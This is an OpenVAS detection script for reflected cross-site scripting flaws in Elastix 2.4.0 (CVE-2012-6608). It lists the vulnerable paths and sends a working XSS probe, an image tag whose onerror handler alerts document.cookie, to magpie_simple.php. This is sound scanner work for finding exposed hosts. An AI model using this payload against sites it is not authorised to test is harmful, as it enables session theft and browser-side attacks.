###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_elastix_mult_xss_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# Elastix Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803708");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2012-6608");
  script_bugtraq_id(56746);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-06-03 15:04:46 +0530 (Mon, 03 Jun 2013)");
  script_name("Elastix Multiple Cross-Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Elastix and is prone to multiple cross site
  scripting vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check whether it is able to read the
  cookie or not.");
  script_tag(name:"insight", value:"Multiple flaws due to

  - Input passed via the URL to '/libs/jpgraph/Examples/bar_csimex3.php/' is
  not properly sanitised before being returned to the user.

  - Input passed via the 'url' parameter to
  '/libs/magpierss/scripts/magpie_simple.php' is not properly sanitised
  before being returned to the user.

  - Input passed via the 'Page' parameter to 'xmlservices/E_book.php' is not
  properly sanitised before being returned to the user.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a users browser session in context of an affected site and
  launch other attacks.");
  script_tag(name:"affected", value:"Elastix version 2.4.0 Stable and prior.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121832/elastix240-xss.txt");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/elastix-240-cross-site-scripting");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_category(ACT_GATHER_INFO);
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

eport = get_http_port(default:80);

if(!can_host_php(port:eport)){
  exit(0);
}

foreach dir (make_list_unique("/", "/elastix", cgi_dirs(port:eport)))
{

  if( dir == "/" ) dir = "";

  ## Request for the index.php
  rcvRes = http_get_cache(item:dir + "/index.php", port:eport);

  if(rcvRes && ">Elastix<" >< rcvRes && "http://www.elastix.org" >< rcvRes)
  {

    url = dir + '/libs/magpierss/scripts/magpie_simple.php?url="><' +
                'IMg+srC%3D+x+OnerRoR+%3D+alert(document.cookie)>';

   if(http_vuln_check(port: eport, url: url, check_header: TRUE,
       pattern: "OnerRoR = alert\(document.cookie\)>",
       extra_check: make_list("Channel:", "RSS URL:")))
    {
      security_message(port:eport);
      exit(0);
    }
  }
}

exit(99);
